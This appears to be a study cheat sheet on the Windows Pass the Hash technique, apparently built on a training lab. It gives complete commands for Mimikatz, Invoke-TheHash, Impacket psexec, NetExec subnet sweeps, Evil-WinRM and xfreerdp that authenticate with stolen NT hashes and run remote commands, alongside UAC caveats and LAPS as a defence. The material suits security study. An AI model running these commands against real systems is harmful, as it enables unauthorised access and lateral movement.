# Pass the Hash (PtH)

## Core Concept

Pass the Hash allows an attacker to authenticate using a stolen NTLM/NT hash without recovering the plaintext password.

```text
NT hash
   ↓
NTLM authentication
   ↓
authenticated session
```

Instead of:

```text
Hash → Crack → Password → Login
```

you may be able to:

```text
Hash → NTLM authentication → Login
```

---

# Where NT Hashes Come From

Common sources:

```text
SAM
    ↓
local account hashes

NTDS.dit
    ↓
domain account hashes

LSASS
    ↓
in-memory credential material
```

---

# NTLM Authentication

Simplified:

```text
Client                     Server
  │                          │
  │──── authentication ─────►│
  │◄──────── challenge ──────│
  │──── hash-based response ─►│
  │◄──── result ──────────────│
```

The plaintext password does not need to be transmitted.

Therefore a stolen NT hash can sometimes be used directly for NTLM authentication.

Important:

```text
NT hash ≠ plaintext password
```

---

# Requirements

Typical PtH requirements:

```text
1. Valid NT hash
2. Correct username
3. Correct local/domain context
4. Target protocol supporting appropriate NTLM authentication
5. Sufficient privileges on target for requested action
```

Authentication:

```text
valid hash
```

doesn't automatically mean:

```text
administrator
```

---

# Local vs Domain Accounts

Domain:

```text
DOMAIN\user
```

or:

```text
user@domain
```

Local:

```text
.\Administrator
```

NetExec:

```text
-d .
```

means:

```text
local account context
```

---

# Mimikatz — Windows

Relevant module:

```text
sekurlsa::pth
```

Example:

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NT_HASH> /domain:inlanefreight.htb /run:cmd.exe" exit
```

Parameters:

```text
/user:
    account

/rc4:
    NT hash used as credential material

/domain:
    domain

/run:
    process to launch
```

Concept:

```text
NT hash
   ↓
Mimikatz creates PtH logon/process context
   ↓
run program
   ↓
program can use NTLM authentication
```

---

# Invoke-TheHash — Windows

PowerShell collection for PtH using:

```text
SMB
WMI
```

Import:

```powershell
Import-Module .\Invoke-TheHash.psd1
```

### SMB

General structure:

```powershell
Invoke-SMBExec `
    -Target <TARGET> `
    -Domain <DOMAIN> `
    -Username <USER> `
    -Hash <NT_HASH> `
    -Command "<COMMAND>" `
    -Verbose
```

Concept:

```text
PtH
 ↓
SMB
 ↓
Service Control Manager
 ↓
remote command execution
```

### WMI

General structure:

```powershell
Invoke-WMIExec `
    -Target <TARGET> `
    -Domain <DOMAIN> `
    -Username <USER> `
    -Hash <NT_HASH> `
    -Command "<COMMAND>"
```

Concept:

```text
PtH
 ↓
WMI
 ↓
remote process execution
```

Important:

```text
Client does not necessarily need local admin
but
account/hash must have sufficient rights on target
```

---

# Impacket — Linux

### PsExec

```bash
impacket-psexec <USER>@<TARGET> \
    -hashes :<NT_HASH>
```

Example:

```bash
impacket-psexec administrator@10.129.201.126 \
    -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Format:

```text
LM_HASH:NT_HASH
```

Therefore:

```text
:<NT_HASH>
```

means the LM portion is empty and the supplied value is the NT hash.

Concept:

```text
PtH
 ↓
SMB
 ↓
ADMIN$
 ↓
upload executable
 ↓
Service Control Manager
 ↓
service execution
 ↓
shell
```

Other Impacket PtH-capable execution tools:

```text
impacket-wmiexec
impacket-atexec
impacket-smbexec
```

---

# NetExec — Linux

### Test SMB authentication

```bash
netexec smb <TARGET> \
    -u <USER> \
    -d . \
    -H <NT_HASH>
```

### Test a subnet

```bash
netexec smb 172.16.1.0/24 \
    -u Administrator \
    -d . \
    -H <NT_HASH>
```

### Local authentication across hosts

```bash
netexec smb 172.16.1.0/24 \
    -u Administrator \
    -H <NT_HASH> \
    --local-auth
```

Purpose:

```text
Find systems where the same local administrator
credential/hash has been reused.
```

---

# NetExec Command Execution

```bash
netexec smb <TARGET> \
    -u Administrator \
    -d . \
    -H <NT_HASH> \
    -x whoami
```

Useful verification:

```text
whoami
whoami /all
```

### `Pwn3d!`

Usually means NetExec determined that the supplied credentials have the required administrative/command-execution capability for that target/protocol.

It does not mean every possible privilege has been verified.

---

# Evil-WinRM — Linux

PtH through WinRM:

```bash
evil-winrm \
    -i <TARGET> \
    -u <USER> \
    -H <NT_HASH>
```

Domain account example:

```text
user@domain
```

Concept:

```text
NT hash
 ↓
NTLM authentication
 ↓
WinRM
 ↓
PowerShell session
```

Useful when:

```text
SMB unavailable
or
WinRM is the available remote-management path
```

---

# RDP PtH

FreeRDP:

```bash
xfreerdp \
    /v:<TARGET> \
    /u:<USER> \
    /pth:<NT_HASH>
```

Example:

```bash
xfreerdp \
    /v:10.129.201.126 \
    /u:julio \
    /pth:64F12CDDAA88057E06A81B54E73B949B
```

Important caveat:

```text
RDP PtH requires the appropriate
Restricted Admin / server configuration.
```

Do not assume `/pth` will work against every RDP server.

---

# UAC and Local PtH

Registry:

```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

General behavior:

```text
0
 ↓
remote UAC filtering applies to local accounts

1
 ↓
other local admin accounts can receive
full remote administrative token
```

Built-in Administrator:

```text
RID 500
```

is treated specially.

Additional setting:

```text
FilterAdministratorToken
```

If enabled:

```text
FilterAdministratorToken = 1
```

the built-in Administrator account can also be subject to UAC filtering.

Important:

```text
Local account PtH
    ≠
guaranteed remote admin access
```

Always consider UAC/token filtering.

---

# Local Admin Password Reuse

Common attack chain:

```text
Compromise HOST01
      ↓
Dump local Administrator NT hash
      ↓
Test other hosts
      ↓
Same hash works on HOST02
      ↓
PtH
      ↓
HOST02 administrative access
```

Why it happens:

```text
Gold images
Same local admin password
Poor credential management
Legacy administration practices
```

Defensive mitigation:

```text
LAPS / Windows LAPS
```

which can provide unique, managed local administrator passwords.

---

# Tool Selection

```text
Windows local process
    ↓
Mimikatz

Windows remote SMB/WMI
    ↓
Invoke-TheHash

Linux SMB/service execution
    ↓
Impacket PsExec / SMBExec

Linux broad SMB testing
    ↓
NetExec

Linux WinRM
    ↓
Evil-WinRM

Linux RDP
    ↓
xfreerdp
```

---

# PtH vs Password Cracking

```text
PASSWORD CRACKING

NT hash
   ↓
wordlist/rules/mask
   ↓
candidate password
   ↓
plaintext
```

```text
PASS THE HASH

NT hash
   ↓
NTLM authentication
   ↓
access
```

Golden rule:

```text
You do NOT need the plaintext password
for every NTLM authentication scenario.
```

---

# Full Attack Chain

```text
SAM / NTDS.dit / LSASS
        ↓
     NT hash
        ↓
   Identify account
        ↓
   Identify target
        ↓
 Identify protocol
        ↓
 ┌──────┼─────────┬─────────┐
 SMB    WMI      WinRM      RDP
  ↓      ↓         ↓         ↓
Exec    Exec     PS shell    GUI
        ↓
Check authorization/UAC
        ↓
Lateral movement /
remote administration
```

---

# Troubleshooting Mindset

If PtH fails, don't immediately conclude:

```text
hash is wrong
```

Check:

```text
1. Is the username correct?
2. Domain or local account?
3. Is the NT hash correct?
4. Does the target support NTLM for this path?
5. Is the required service reachable?
6. Does the account have the required target privileges?
7. Is UAC filtering affecting a local account?
8. Is Restricted Admin/configuration required for RDP?
9. Is SMB/WinRM/WMI blocked?
```

---

# Recognition

```text
SAM
    → local hashes

NTDS.dit
    → domain hashes

LSASS
    → live credential material

NT hash
    → can potentially support PtH

-hashes :NT_HASH
    → Impacket LM:NT format

-H NT_HASH
    → NetExec / Evil-WinRM style hash authentication

-d .
    → local account context

--local-auth
    → local-authentication testing across hosts

Pwn3d!
    → administrative command-execution capability detected

LocalAccountTokenFilterPolicy
    → remote UAC filtering behavior for local accounts

FilterAdministratorToken
    → affects built-in Administrator token filtering
```

## Final mental model

```text
HASH ≠ PASSWORD

But:

HASH
 ↓
can be sufficient authentication material
 ↓
for certain NTLM-based authentication paths
 ↓
without cracking the password
```
